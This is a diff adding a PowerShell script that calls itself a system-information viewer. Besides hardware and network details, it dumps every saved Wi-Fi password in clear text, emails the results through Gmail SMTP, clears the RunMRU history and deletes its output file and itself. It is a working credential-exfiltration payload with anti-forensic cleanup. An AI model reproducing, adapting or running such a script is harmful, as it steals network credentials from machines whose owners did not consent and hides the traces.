@@ -1,0 +1,58 @@
+# Shows details of currently running PC
+# Simen Kjeserud 03/10/2016
+
+$computerSystem = Get-CimInstance CIM_ComputerSystem
+$computerBIOS = Get-CimInstance CIM_BIOSElement
+$computerOS = Get-CimInstance CIM_OperatingSystem
+$computerCPU = Get-CimInstance CIM_Processor
+$computerHDD = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = 'C:'"
+$computerPubIP = irm ipinfo.io/ip
+$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
+foreach ($Network in $Networks) {
+
+$IsDHCPEnabled = $false
+If($network.DHCPEnabled) {
+$IsDHCPEnabled = $true
+  }
+[string[]]$computerMAC =$Network.MACAddress
+}
+
+
+Clear-Host
+$(
+Write-Host "System Information for: " $computerSystem.Name -BackgroundColor DarkCyan
+"Manufacturer: " + $computerSystem.Manufacturer
+"Model: " + $computerSystem.Model
+"Serial Number: " + $computerBIOS.SerialNumber
+"CPU: " + $computerCPU.Name
+"HDD Capacity: "  + "{0:N2}" -f ($computerHDD.Size/1GB) + "GB"
+"HDD Space: " + "{0:P2}" -f ($computerHDD.FreeSpace/$computerHDD.Size) + " Free (" + "{0:N2}" -f ($computerHDD.FreeSpace/1GB) + "GB)"
+"RAM: " + "{0:N2}" -f ($computerSystem.TotalPhysicalMemory/1GB) + "GB"
+"Operating System: " + $computerOS.caption + ", Service Pack: " + $computerOS.ServicePackMajorVersion
+"User logged In: " + $computerSystem.UserName
+"Last Reboot: " + $computerOS.LastBootUpTime
+"Computers MAC adress: " + $computerMAC
+"Computers IP adress: " + $computerIP.ipaddress[0]
+"Public IP adress: " + $computerPubIP
+$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
+$exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
+$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
+) *>&1 > i.txt
+
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($user, $passw)
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = $user
+$ReportEmail.To.Add($user)
+$ReportEmail.Subject = 'Info file'
+$ReportEmail.Body = (Get-Content i.txt | out-string)
+$SMTPInfo.Send($ReportEmail)
+
+powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+
+del i.txt
+del in.ps1
